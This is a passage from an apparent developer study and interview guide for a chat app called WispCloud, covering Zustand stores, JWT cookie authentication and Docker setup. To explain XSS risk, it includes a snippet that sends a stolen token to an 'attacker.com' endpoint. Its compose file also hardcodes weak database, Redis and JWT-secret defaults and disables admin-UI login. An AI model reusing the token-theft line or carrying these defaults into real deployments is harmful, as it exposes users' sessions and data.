    }
  },

  // Update user profile
  updateProfile: async (data) => {
    set({ isUpdatingProfile: true });
    try {
      const res = await axiosInstance.put("/auth/update-profile", data);
      set({ authUser: res.data });
      toast.success("Profile updated successfully");
    } catch (error) {
      console.log("error in update profile:", error);
      toast.error(error.response.data.message);
    } finally {
      set({ isUpdatingProfile: false });
    }
  },

  // ========== SOCKET.IO INTEGRATION ==========

  connectSocket: () => {
    const { authUser, socket: existingSocket } = get();
    if (!authUser) return;

    // Prevent duplicate connections
    if (existingSocket?.connected) {
      console.log('Socket already connected');
      return;
    }

    // Disconnect existing socket if present
    if (existingSocket) {
      existingSocket.disconnect();
    }

    // Create new Socket.IO connection
    const socket = io(BASE_URL, {
      query: { userId: authUser._id },
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
    });

    set({ socket: socket });

    // Listen for online users updates
    socket.on("getOnlineUsers", (userIds) => {
      set({ onlineUsers: userIds });
    });

    socket.on("connect", () => {
      console.log('Socket connected:', socket.id);
    });

    socket.on("connect_error", (error) => {
      console.error('Socket connection error:', error);
    });
  },

  disconnectSocket: () => {
    if (get().socket?.connected) get().socket.disconnect();
  },
}));
```

**Key Patterns:**

1. **Accessing current state**: Use `get()` to read current state inside actions
2. **Updating state**: Use `set()` to merge new state
3. **Async actions**: Regular async/await functions
4. **Derived data**: Use selectors or compute in components

#### 2. useChatStore.js - DM Chat State

```javascript
// C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\store\useChatStore.js
import { create } from "zustand";
import toast from "react-hot-toast";
import { axiosInstance } from "../lib/axios";
import { useAuthStore } from "./useAuthStore";

export const useChatStore = create((set, get) => ({
  // ========== STATE ==========
  messages: [],
  users: [],
  selectedUser: null,
  isUsersLoading: false,
  isMessagesLoading: false,

  // ========== ACTIONS ==========

  // Fetch all users for sidebar
  getUsers: async () => {
    const { isUsersLoading } = get();
    if (isUsersLoading) return; // Prevent concurrent calls

    set({ isUsersLoading: true });
    try {
      const res = await axiosInstance.get("/messages/users");
      set({ users: res.data });
    } catch (error) {
      const message = error.response?.data?.message || error.response?.data?.error;
      if (error.response?.status === 429) {
        toast.error("Too many requests. Please wait a moment.");
      } else if (message) {
        toast.error(message);
      } else {
        console.error("Failed to fetch users:", error);
      }
      set({ users: [] });
    } finally {
      set({ isUsersLoading: false });
    }
  },

  // Fetch messages with specific user
  getMessages: async (userId) => {
    set({ isMessagesLoading: true });
    try {
      const res = await axiosInstance.get(`/messages/${userId}`);
      const messages = Array.isArray(res.data) ? res.data : (res.data.messages || []);
      set({ messages: messages || [] });
    } catch (error) {
      toast.error(error.response?.data?.message || "Failed to fetch messages");
      set({ messages: [] });
    } finally {
      set({ isMessagesLoading: false });
    }
  },

  // Send new message
  sendMessage: async (messageData) => {
    const { selectedUser, messages } = get();
    try {
      const res = await axiosInstance.post(`/messages/send/${selectedUser._id}`, messageData);
      set({ messages: [...messages, res.data] });
    } catch (error) {
      toast.error(error.response?.data?.message || "Failed to send message");
    }
  },

  // Subscribe to real-time messages via Socket.IO
  subscribeToMessages: () => {
    const { selectedUser } = get();
    if (!selectedUser) return;

    const socket = useAuthStore.getState().socket;

    socket.on("newMessage", (newMessage) => {
      const isMessageSentFromSelectedUser = newMessage.senderId === selectedUser._id;
      if (!isMessageSentFromSelectedUser) return;

      set({
        messages: [...get().messages, newMessage],
      });
    });

    // Subscribe to read receipts
    socket.on("messagesRead", (data) => {
      const { messageIds, readAt } = data;
      set((state) => ({
        messages: state.messages.map((msg) =>
          messageIds.includes(msg._id)
            ? { ...msg, status: "read", readAt }
            : msg
        ),
      }));
    });
  },

  unsubscribeFromMessages: () => {
    const socket = useAuthStore.getState().socket;
    socket.off("newMessage");
    socket.off("messagesRead");
  },

  // Mark messages as read
  markMessagesAsRead: async (userId) => {
    try {
      await axiosInstance.put(`/messages/read/${userId}`);
    } catch (error) {
      console.error("Error marking messages as read:", error);
    }
  },

  setSelectedUser: (selectedUser) => set({ selectedUser }),
}));
```

#### 3. useGroupStore.js - Group Chat State

```javascript
// C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\store\useGroupStore.js
import { create } from 'zustand';
import toast from 'react-hot-toast';
import { axiosInstance } from '../lib/axios';
import { useAuthStore } from './useAuthStore';

export const useGroupStore = create((set, get) => ({
  // ========== STATE ==========
  groups: [],
  selectedGroup: null,
  groupMessages: [],
  isGroupsLoading: false,
  isMessagesLoading: false,

  // ========== GROUP MANAGEMENT ==========

  // Fetch user's groups
  getUserGroups: async () => {
    set({ isGroupsLoading: true });
    try {
      const res = await axiosInstance.get('/groups/user/groups');
      set({ groups: res.data });
    } catch (error) {
      toast.error(error.response?.data?.error || 'Failed to fetch groups');
    } finally {
      set({ isGroupsLoading: false });
    }
  },

  // Create new group
  createGroup: async (groupData) => {
    try {
      const res = await axiosInstance.post('/groups', groupData);
      set((state) => ({ groups: [...state.groups, res.data] }));
      toast.success('Group created successfully');
      return res.data;
    } catch (error) {
      const message = error.response?.data?.error || error.response?.data?.message;
      if (error.response?.status === 429) {
        toast.error('Too many requests. Please wait a moment.');
      } else if (message) {
        toast.error(message);
      } else {
        toast.error('Failed to create group');
      }
      throw error;
    }
  },

  // Add members to group
  addMembers: async (groupId, userIds) => {
    try {
      const res = await axiosInstance.post(`/groups/${groupId}/members`, { userIds });
      toast.success('Members added successfully');
      return res.data;
    } catch (error) {
      const message = error.response?.data?.error || error.response?.data?.message;
      if (error.response?.status === 429) {
        toast.error('Too many requests. Please wait a moment.');
      } else if (message) {
        toast.error(message);
      } else {
        toast.error('Failed to add members');
      }
      throw error;
    }
  },

  // ========== MESSAGING ==========

  // Set selected group (and load messages)
  setSelectedGroup: async (group) => {
    set({ selectedGroup: group });
    if (group) {
      await get().getGroupMessages(group._id);
    }
  },

  // Get group messages
  getGroupMessages: async (groupId) => {
    set({ isMessagesLoading: true });
    try {
      const res = await axiosInstance.get(`/groups/${groupId}/messages`);
      set({ groupMessages: res.data.messages });
    } catch (error) {
      toast.error(error.response?.data?.error || 'Failed to fetch messages');
    } finally {
      set({ isMessagesLoading: false });
    }
  },

  // Send group message
  sendGroupMessage: async (groupId, messageData) => {
    const { selectedGroup, groupMessages } = get();
    try {
      const res = await axiosInstance.post(`/groups/${groupId}/messages`, messageData);

      // Only update if this is the currently selected group
      if (selectedGroup?._id === groupId) {
        set({ groupMessages: [...groupMessages, res.data] });
      }

      return res.data;
    } catch (error) {
      toast.error(error.response?.data?.error || 'Failed to send message');
      throw error;
    }
  },

  // ========== SOCKET.IO INTEGRATION ==========

  // Subscribe to group messages
  subscribeToGroupMessages: () => {
    const { socket } = useAuthStore.getState();
    if (!socket) return;

    socket.on('newGroupMessage', ({ message, groupId }) => {
      const { selectedGroup, groupMessages } = get();

      // Add message if it's for the currently selected group
      if (selectedGroup?._id === groupId) {
        set({ groupMessages: [...groupMessages, message] });
      }

      // Update group's last message in groups list
      set((state) => ({
        groups: state.groups.map((g) =>
          g._id === groupId
            ? { ...g, lastMessage: message }
            : g
        ),
      }));
    });

    socket.on('groupMessageDeleted', ({ messageId, groupId }) => {
      const { selectedGroup } = get();

      if (selectedGroup?._id === groupId) {
        set((state) => ({
          groupMessages: state.groupMessages.filter((m) => m._id !== messageId),
        }));
      }
    });

    socket.on('groupJoined', ({ groupId }) => {
      get().getUserGroups(); // Refresh groups list
    });
  },

  unsubscribeFromGroupMessages: () => {
    const { socket } = useAuthStore.getState();
    if (!socket) return;

    socket.off('newGroupMessage');
    socket.off('groupMessageDeleted');
    socket.off('groupJoined');
  },

  // Join/leave Socket.IO rooms
  joinGroupRoom: (groupId) => {
    const { socket } = useAuthStore.getState();
    if (!socket) return;
    socket.emit('joinGroup', { groupId });
  },

  leaveGroupRoom: (groupId) => {
    const { socket } = useAuthStore.getState();
    if (!socket) return;
    socket.emit('leaveGroup', { groupId });
  },
}));
```

### Zustand Best Practices in WispCloud

1. **Separate stores by domain** - Auth, Chat, Groups (not one giant store)
2. **Actions co-located with state** - Everything in one place
3. **Async actions return promises** - Enables error handling in components
4. **Use toast notifications** - User feedback for all actions
5. **Prevent race conditions** - Check loading state before API calls

### Using Stores in Components

```jsx
// Select only needed state (prevents unnecessary re-renders)
const ChatContainer = () => {
  const messages = useChatStore((state) => state.messages);
  const sendMessage = useChatStore((state) => state.sendMessage);
  const isLoading = useChatStore((state) => state.isMessagesLoading);

  // Component only re-renders when messages, sendMessage, or isLoading changes
};

// OR destructure (re-renders on ANY store change - avoid!)
const ChatContainer = () => {
  const { messages, sendMessage, isLoading } = useChatStore();
  // ⚠️ Re-renders whenever ANYTHING in store changes
};
```

### Common Interview Questions

**Q1: Why Zustand over Context API?**

**A:**
- Context causes all consumers to re-render (even if they don't use changed data)
- Zustand allows fine-grained subscriptions (only re-render what uses changed data)
- Zustand has better performance for frequent updates

**Q2: How does Zustand handle middleware?**

**A:** Zustand supports middleware like Redux DevTools, persist, immer:
```javascript
import { create } from 'zustand';
import { devtools, persist } from 'zustand/middleware';

const useStore = create(
  devtools(
    persist(
      (set) => ({ /* state */ }),
      { name: 'auth-storage' }
    )
  )
);
```

**Q3: Can Zustand be used outside React?**

**A:** Yes! Zustand stores are vanilla JS. You can use `getState()` and `setState()` directly:
```javascript
// Outside React component
const currentUser = useAuthStore.getState().authUser;
useAuthStore.setState({ authUser: newUser });
```

---

## 3.7 JWT Authentication - Secure Token-Based Auth

### What is JWT?

JWT (JSON Web Token) is a compact, URL-safe token format for securely transmitting information between parties. WispCloud uses JWT for stateless authentication.

**Structure:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhhYjEyMyIsImlhdCI6MTcwNjAyNDAwMCwiZXhwIjoxNzA2NjI4ODAwfQ.4hF8aBc9D3eF6gH7iJ8kL9mN0oP1qR2sT3uV4wX5yZ6
│                                      │                                                                                                                │                                              │
│         HEADER                       │                                            PAYLOAD                                                            │                   SIGNATURE                  │
│   (Algorithm & Token Type)           │                               (Claims - user data)                                                            │          (Verify token integrity)            │
└──────────────────────────────────────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴──────────────────────────────────────────────┘
```

**Decoded:**

```json
// HEADER
{
  "alg": "HS256",
  "typ": "JWT"
}

// PAYLOAD
{
  "userId": "678ab123",
  "iat": 1706024000,  // Issued at (timestamp)
  "exp": 1706628800   // Expires (timestamp)
}

// SIGNATURE
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

### JWT Generation in WispCloud

**File: `C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\utils.js`**

```javascript
import jwt from "jsonwebtoken"

export const generateToken = (userId, res) => {
  // Step 1: Sign the token with userId as payload
  const token = jwt.sign(
    { userId },                    // Payload (claims)
    process.env.JWT_SECRET,        // Secret key (HS256 algorithm)
    { expiresIn: "7d" }           // Token expires in 7 days
  );

  // Step 2: Set token as httpOnly cookie (secure storage)
  res.cookie("jwt", token, {
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days in milliseconds
    httpOnly: true,                    // ⚠️ CRITICAL: Prevents XSS attacks
    sameSite: "strict",                // ⚠️ CRITICAL: Prevents CSRF attacks
    secure: process.env.NODE_ENV !== "development" // HTTPS only in production
  });

  return token;
};
```

**Security Breakdown:**

| Setting | Purpose | Attack Prevented |
|---------|---------|------------------|
| `httpOnly: true` | Cookie not accessible via JavaScript | XSS (Cross-Site Scripting) |
| `sameSite: "strict"` | Cookie only sent to same site | CSRF (Cross-Site Request Forgery) |
| `secure: true` | Cookie only sent over HTTPS | Man-in-the-Middle attacks |
| `expiresIn: "7d"` | Token auto-expires after 7 days | Stolen token exploitation |

### JWT Verification Middleware

**File: `C:\Users\Nilansh\Desktop\WispCloud\backend\src\middleware\auth.middleware.js`**

```javascript
import jwt from "jsonwebtoken";
import User from "../models/user.model.js";

export const protectRoute = async (req, res, next) => {
  try {
    // Step 1: Extract token from cookie
    const token = req.cookies.jwt;

    if (!token) {
      return res.status(401).json({ message: "Unauthorized - No Token Provided" });
    }

    // Step 2: Verify token signature and decode payload
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    if (!decoded) {
      return res.status(401).json({ message: "Unauthorized - Invalid Token" });
    }

    // Step 3: Fetch user from database (ensure user still exists)
    const user = await User.findById(decoded.userId).select("-password");

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Step 4: Attach user to request object (available in controllers)
    req.user = user;

    next(); // Proceed to route handler
  } catch (error) {
    console.log("Error in protectRoute middleware", error.message);

    // Handle specific JWT errors
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ message: "Token expired" });
    }
    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ message: "Invalid token" });
    }

    res.status(500).json({ message: "Internal server error" });
  }
};
```

### Authentication Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                      USER SIGNUP/LOGIN                          │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  POST /auth/signup or /auth/login                               │
│  Body: { email, password }                                      │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  Backend validates credentials                                  │
│  - Check if user exists                                         │
│  - Verify password (bcrypt.compare)                             │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  generateToken(userId, res)                                     │
│  1. Create JWT: { userId, iat, exp }                            │
│  2. Sign with SECRET_KEY                                        │
│  3. Set httpOnly cookie: "jwt=eyJhbGc..."                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  Response: { _id, email, username, profilePic }                 │
│  + Set-Cookie header with JWT                                   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  Browser stores cookie automatically                            │
│  (httpOnly = not accessible to JavaScript)                      │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│                   SUBSEQUENT REQUESTS                           │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  GET /messages/users (protected route)                          │
│  Cookie: jwt=eyJhbGc... (sent automatically)                    │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  protectRoute middleware runs BEFORE controller                 │
│  1. Extract token from req.cookies.jwt                          │
│  2. Verify signature with SECRET_KEY                            │
│  3. Decode payload → { userId, iat, exp }                       │
│  4. Fetch user from DB                                          │
│  5. Attach to req.user                                          │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  Controller has access to req.user                              │
│  Example: const userId = req.user._id;                          │
└─────────────────────────────────────────────────────────────────┘
```

### Login Implementation

**File: `C:\Users\Nilansh\Desktop\WispCloud\backend\src\controllers\auth.controller.js`**

```javascript
import bcrypt from "bcryptjs"
import { generateToken } from "../lib/utils.js";
import User from "../models/user.model.js"

export const login = async (req, res) => {
  const { email, password } = req.body
  try {
    // Step 1: Find user by email (include password field)
    const user = await User.findOne({ email }).select("+password")

    if (!user) {
      return res.status(400).json({ message: "Invalid credentials" });
    }

    // Step 2: Verify password using bcrypt
    const isPasswordCorrect = await bcrypt.compare(password, user.password);

    if (!isPasswordCorrect) {
      return res.status(400).json({ message: "Invalid credentials" });
    }

    // Step 3: Generate JWT and set cookie
    generateToken(user._id, res)

    // Step 4: Send user data (without password)
    res.status(200).json({
      _id: user._id,
      fullName: user.fullName,
      email: user.email,
      username: user.username,
      profilePic: user.profilePic,
    });

  } catch (error) {
    console.log("Error in login controller", error.message);
    res.status(500).json({ message: "Internal server error" });
  }
};
```

### Signup Implementation

```javascript
export const signup = async (req, res) => {
  const { fullName, email, password, username } = req.body
  try {
    // Step 1: Validate input
    if (!fullName || !email || !password || !username) {
      return res.status(400).json({ message: "All fields are required" });
    }

    if (password.length < 6) {
      return res.status(400).json({ message: "Password should be at least 6 characters" });
    }

    if (username.length < 3 || username.length > 20) {
      return res.status(400).json({ message: "Username must be 3-20 characters" });
    }

    // Step 2: Check if user already exists
    const existingUser = await User.findOne({ $or: [{ email }, { username }] })

    if (existingUser) {
      if (existingUser.email === email) {
        return res.status(400).json({ message: "Email already exists" });
      }
      if (existingUser.username === username) {
        return res.status(400).json({ message: "Username already taken" });
      }
    }

    // Step 3: Hash password
    const salt = await bcrypt.genSalt(10)
    const hashPassword = await bcrypt.hash(password, salt)

    // Step 4: Create user
    const newUser = new User({
      fullName,
      email,
      username,
      password: hashPassword
    })

    if (newUser) {
      // Step 5: Generate JWT and set cookie
      generateToken(newUser._id, res);
      await newUser.save();

      // Step 6: Send response (without password)
      res.status(201).json({
        _id: newUser._id,
        fullName: newUser.fullName,
        email: newUser.email,
        username: newUser.username,
        profilePic: newUser.profilePic,
      })
    } else {
      res.status(400).json({ message: "Invalid user data" });
    }
  } catch (error) {
    console.log("Error in signup controller", error.message);
    res.status(500).json({ message: "internal server error" });
  }
};
```

### Why httpOnly Cookies?

**Alternative 1: localStorage**
```javascript
// ❌ VULNERABLE TO XSS
localStorage.setItem('token', jwt);

// Malicious script can steal token:
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolenToken
});
```

**Alternative 2: httpOnly Cookie**
```javascript
// ✅ SECURE (JavaScript cannot access)
res.cookie("jwt", token, { httpOnly: true });

// Attacker script tries:
document.cookie; // Returns empty string (httpOnly blocks access)
```

### Token Expiration Strategy

```
User logs in
    ↓
Token created: { exp: now + 7 days }
    ↓
Day 1-6: Token valid → Requests succeed
    ↓
Day 7: Token expires
    ↓
User makes request → 401 Unauthorized
    ↓
Frontend detects 401 → Redirect to /login
```

**WispCloud Strategy:**
- **Access Token**: 7 days (stored in httpOnly cookie)
- **No refresh token** (simplicity for MVP)
- **Future enhancement**: Refresh token rotation

### Common Interview Questions

**Q1: JWT vs Session-based auth?**

**A:**

| JWT (WispCloud) | Session-based |
|-----------------|---------------|
| Stateless (no server storage) | Stateful (session store required) |
| Scalable (no session replication) | Complex to scale (shared session store) |
| Token stored client-side | Session ID stored client-side |
| Can't revoke easily | Easy to revoke (delete session) |

**Q2: How do you revoke a JWT?**

**A:**
- **Short expiration**: 7 days in WispCloud
- **Blacklist**: Store revoked tokens in Redis (with TTL)
- **Token versioning**: Add version field, increment on logout

**Q3: Why not store JWT in localStorage?**

**A:** XSS vulnerability. Malicious scripts can access localStorage. httpOnly cookies are immune to JavaScript access.

**Q4: What's the difference between iat and exp?**

**A:**
- `iat` (Issued At): Timestamp when token was created
- `exp` (Expires): Timestamp when token becomes invalid

---

## 3.8 Docker & Containerization - Production-Ready Deployment

### Containers vs Virtual Machines

```
┌─────────────────────────────────────────────────────────────────┐
│                    VIRTUAL MACHINES                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                      │
│  │  App A   │  │  App B   │  │  App C   │                      │
│  ├──────────┤  ├──────────┤  ├──────────┤                      │
│  │  Bins    │  │  Bins    │  │  Bins    │                      │
│  ├──────────┤  ├──────────┤  ├──────────┤                      │
│  │  Guest   │  │  Guest   │  │  Guest   │                      │
│  │   OS     │  │   OS     │  │   OS     │  ← Full OS per app! │
│  └──────────┘  └──────────┘  └──────────┘                      │
│  ─────────────────────────────────────────                      │
│          Hypervisor (VMware, VirtualBox)                        │
│  ─────────────────────────────────────────                      │
│              Host Operating System                              │
│  ─────────────────────────────────────────                      │
│                   Hardware                                      │
│                                                                  │
│  Size: GBs per VM | Boot time: Minutes                          │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                       CONTAINERS                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                      │
│  │  App A   │  │  App B   │  │  App C   │                      │
│  ├──────────┤  ├──────────┤  ├──────────┤                      │
│  │  Bins    │  │  Bins    │  │  Bins    │  ← Shared resources │
│  └──────────┘  └──────────┘  └──────────┘                      │
│  ─────────────────────────────────────────                      │
│            Docker Engine (Runtime)                              │
│  ─────────────────────────────────────────                      │
│              Host Operating System                              │
│  ─────────────────────────────────────────                      │
│                   Hardware                                      │
│                                                                  │
│  Size: MBs per container | Boot time: Seconds                   │
└─────────────────────────────────────────────────────────────────┘
```

**Key Differences:**

| Feature | Virtual Machine | Container |
|---------|----------------|-----------|
| Isolation | Full OS isolation | Process-level isolation |
| Size | GBs (includes OS) | MBs (shares host kernel) |
| Boot time | Minutes | Seconds |
| Performance | Slower (overhead) | Near-native |
| Resource usage | High | Low |

### Docker Images - Layered Filesystem

Docker images are built in layers (like an onion):

```
┌────────────────────────────────────┐
│  Layer 4: CMD ["node", "index.js"] │  ← 0 KB (metadata)
├────────────────────────────────────┤
│  Layer 3: COPY . .                 │  ← 50 MB (app code)
├────────────────────────────────────┤
│  Layer 2: RUN npm install          │  ← 200 MB (node_modules)
├────────────────────────────────────┤
│  Layer 1: FROM node:20-alpine      │  ← 150 MB (base image)
└────────────────────────────────────┘

Total image size: 400 MB

Why layers?
- Caching: If package.json unchanged, reuse Layer 2
- Sharing: Multiple containers share base layers
- Efficiency: Only changed layers are downloaded/uploaded
```

### WispCloud Backend Dockerfile - Multi-Stage Build

**File: `C:\Users\Nilansh\Desktop\WispCloud\backend\Dockerfile`**

```dockerfile
# ============================================================
# STAGE 1: Base Image
# ============================================================
FROM node:20-alpine AS base
# Why alpine? Smallest Node.js image (150MB vs 900MB for full)

# ============================================================
# STAGE 2: Dependencies (Production only)
# ============================================================
FROM base AS deps
WORKDIR /app

# Copy only package files first (layer caching optimization)
COPY package*.json ./

# Install ONLY production dependencies
RUN npm ci --only=production && \
    npm cache clean --force
# npm ci: Clean install (faster than npm install)
# --only=production: Skip devDependencies
# clean cache: Reduce image size

# ============================================================
# STAGE 3: Development Environment
# ============================================================
FROM base AS development
WORKDIR /app

COPY package*.json ./
RUN npm install  # Install ALL dependencies (including dev)

COPY . .  # Copy entire app code

EXPOSE 5001

CMD ["npm", "run", "dev"]
# Runs nodemon for hot-reload during development

# ============================================================
# STAGE 4: Production Builder
# ============================================================
FROM base AS builder
WORKDIR /app

COPY package*.json ./
RUN npm ci  # Install all dependencies for build

COPY . .
# In a real app, this stage would compile TypeScript, minify, etc.

# ============================================================
# STAGE 5: Production Runtime
# ============================================================
FROM base AS production
WORKDIR /app

ENV NODE_ENV=production

# Security: Create non-root user
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001
# Running as root is dangerous (container escape = root access to host)

# Copy ONLY production dependencies (from deps stage)
COPY --from=deps --chown=nodejs:nodejs /app/node_modules ./node_modules

# Copy application code
COPY --chown=nodejs:nodejs . .

# Switch to non-root user
USER nodejs

EXPOSE 5001

# Production start command (no nodemon)
CMD ["node", "src/index.js"]
```

**Multi-Stage Build Benefits:**

1. **Smaller final image**: Production image doesn't include dev dependencies
2. **Security**: Non-root user limits damage if container is compromised
3. **Flexibility**: One Dockerfile for dev and prod

**Image Size Comparison:**

```
Without multi-stage:
  ├─ node:20-alpine: 150 MB
  ├─ node_modules (all deps): 500 MB
  ├─ app code: 50 MB
  └─ Total: 700 MB

With multi-stage:
  ├─ node:20-alpine: 150 MB
  ├─ node_modules (prod only): 200 MB
  ├─ app code: 50 MB
  └─ Total: 400 MB (43% smaller!)
```

### Docker Compose - Multi-Container Orchestration

**File: `C:\Users\Nilansh\Desktop\WispCloud\docker-compose.yml`**

```yaml
version: '3.8'

services:
  # ============================================================
  # MongoDB - Database Service
  # ============================================================
  mongodb:
    image: mongo:7
    container_name: wispcloud-mongodb
    restart: unless-stopped  # Auto-restart on crash (except manual stop)

    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: password123
      MONGO_INITDB_DATABASE: wispcloud

    ports:
      - "27017:27017"  # Host:Container port mapping

    volumes:
      - mongodb_data:/data/db  # Persist data (survives container restart)

    networks:
      - wispcloud-network  # Isolated network for services

    healthcheck:
      test: echo 'db.runCommand("ping").ok' | mongosh localhost:27017/test --quiet
      interval: 10s
      timeout: 5s
      retries: 5
      # Container is "healthy" only when healthcheck passes

  # ============================================================
  # Redis - Caching and Session Storage
  # ============================================================
  redis:
    image: redis:7-alpine
    container_name: wispcloud-redis
    restart: unless-stopped

    command: redis-server --appendonly yes --requirepass redis123
    # appendonly: Persist data to disk
    # requirepass: Set Redis password

    ports:
      - "6379:6379"

    volumes:
      - redis_data:/data

    networks:
      - wispcloud-network

    healthcheck:
      test: ["CMD", "redis-cli", "--raw", "incr", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5

  # ============================================================
  # Backend API Service
  # ============================================================
  backend:
    build:
      context: ./backend
      dockerfile: Dockerfile
      target: development  # Use "development" stage from Dockerfile

    container_name: wispcloud-backend
    restart: unless-stopped

    environment:
      NODE_ENV: development
      PORT: 5001
      # Service names are DNS names within the network!
      MONGODB_URI: mongodb://admin:password123@mongodb:27017/wispcloud?authSource=admin
      REDIS_URL: redis://:redis123@redis:6379
      JWT_SECRET: ${JWT_SECRET:-ayushi123}  # Use env var or default
      FRONTEND_URL: ${FRONTEND_URL:-http://localhost:5173}
      CLOUDINARY_CLOUD_NAME: ${CLOUDINARY_CLOUD_NAME}
      CLOUDINARY_API_KEY: ${CLOUDINARY_API_KEY}
      CLOUDINARY_API_SECRET: ${CLOUDINARY_API_SECRET}

    ports:
      - "5001:5001"

    volumes:
      # Hot-reload: Changes on host reflect in container
      - ./backend/src:/app/src
      - ./backend/package.json:/app/package.json
      # Named volume for node_modules (prevents host/container conflict)
      - backend_node_modules:/app/node_modules

    depends_on:
      mongodb:
        condition: service_healthy  # Wait for MongoDB healthcheck
      redis:
        condition: service_healthy  # Wait for Redis healthcheck

    networks:
      - wispcloud-network

    command: npm run dev  # Override CMD from Dockerfile

  # ============================================================
  # Frontend Service
  # ============================================================
  frontend:
    build:
      context: ./frontend/Wisp
      dockerfile: Dockerfile
      target: development

    container_name: wispcloud-frontend
    restart: unless-stopped

    environment:
      VITE_API_URL: http://localhost:5001

    ports:
      - "5173:5173"

    volumes:
      - ./frontend/Wisp/src:/app/src
      - ./frontend/Wisp/public:/app/public
      - ./frontend/Wisp/vite.config.js:/app/vite.config.js
      - frontend_node_modules:/app/node_modules

    depends_on:
      - backend

    networks:
      - wispcloud-network

    command: npm run dev -- --host  # --host: Allow external connections

  # ============================================================
  # Mongo Express - Database Admin UI
  # ============================================================
  mongo-express:
    image: mongo-express:1.0-20
    container_name: wispcloud-mongo-express
    restart: unless-stopped

    environment:
      ME_CONFIG_MONGODB_ADMINUSERNAME: admin
      ME_CONFIG_MONGODB_ADMINPASSWORD: password123
      ME_CONFIG_MONGODB_URL: mongodb://admin:password123@mongodb:27017/
      ME_CONFIG_BASICAUTH: false  # No login required

    ports:
      - "8081:8081"  # Access at http://localhost:8081

    depends_on:
      - mongodb

    networks:
      - wispcloud-network

# ============================================================
# Named Volumes (Persistent Storage)
# ============================================================
volumes:
  mongodb_data:     # MongoDB data persists across restarts
    driver: local
  redis_data:       # Redis data persists across restarts
    driver: local
  backend_node_modules:  # Isolated node_modules for backend
    driver: local
  frontend_node_modules: # Isolated node_modules for frontend
    driver: local

# ============================================================
# Custom Network
# ============================================================
networks:
  wispcloud-network:
    driver: bridge  # Default Docker network driver
```

### Docker Compose Commands

```bash
# Start all services (detached mode)
docker-compose up -d

# View running containers
docker-compose ps

# View logs
docker-compose logs -f backend  # Follow backend logs
docker-compose logs --tail=100  # Last 100 lines from all services

# Stop all services
docker-compose down

# Stop and remove volumes (⚠️ deletes data!)
docker-compose down -v

# Rebuild images
docker-compose build

# Restart specific service
docker-compose restart backend

# Execute command in running container
docker-compose exec backend sh  # Open shell in backend container
```

### Service Communication

Services communicate using service names as hostnames:

```javascript
// Backend connecting to MongoDB
mongoose.connect("mongodb://admin:password123@mongodb:27017/wispcloud");
//                                            ^^^^^^^^
//                            Service name = DNS hostname

// Backend connecting to Redis
const redisClient = createClient({ url: "redis://:redis123@redis:6379" });
//                                                           ^^^^^
//                                                    Service name = DNS hostname
```

**Network Diagram:**

```
┌────────────────────────────────────────────────────────────┐
│              Docker Network: wispcloud-network             │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐   │
│  │  frontend   │───▶│  backend    │───▶│  mongodb    │   │
│  │  :5173      │    │  :5001      │    │  :27017     │   │
│  └─────────────┘    └─────────────┘    └─────────────┘   │
│                            │                               │
│                            ▼                               │
│                     ┌─────────────┐                        │
│                     │   redis     │                        │
│                     │   :6379     │                        │
│                     └─────────────┘                        │
│                                                             │
└────────────────────────────────────────────────────────────┘
         ▲                    ▲                    ▲
         │                    │                    │
    Port 5173            Port 5001           Port 27017
         │                    │                    │
         └────────────────────┴────────────────────┘
                      Host Machine
                  (localhost)
```

### Healthchecks Explained

```yaml
healthcheck:
  test: echo 'db.runCommand("ping").ok' | mongosh localhost:27017/test --quiet
  interval: 10s    # Check every 10 seconds
  timeout: 5s      # Command must complete within 5 seconds
  retries: 5       # Retry 5 times before marking unhealthy
```

**Healthcheck Lifecycle:**

```
Container starts
     ↓
Wait "interval" seconds (10s)
     ↓
Run "test" command
     ↓
Did it succeed within "timeout" (5s)?
     ├─ YES → Container is HEALTHY
     │        ↓
     │   Dependent services can start
     │
     └─ NO → Retry count++
              ↓
         Retry count < 5?
              ├─ YES → Wait interval, try again
              └─ NO → Container is UNHEALTHY
                      ↓
                 Restart container (if restart policy set)
```

### Volume Types

1. **Named Volumes** (managed by Docker)
```yaml
volumes:
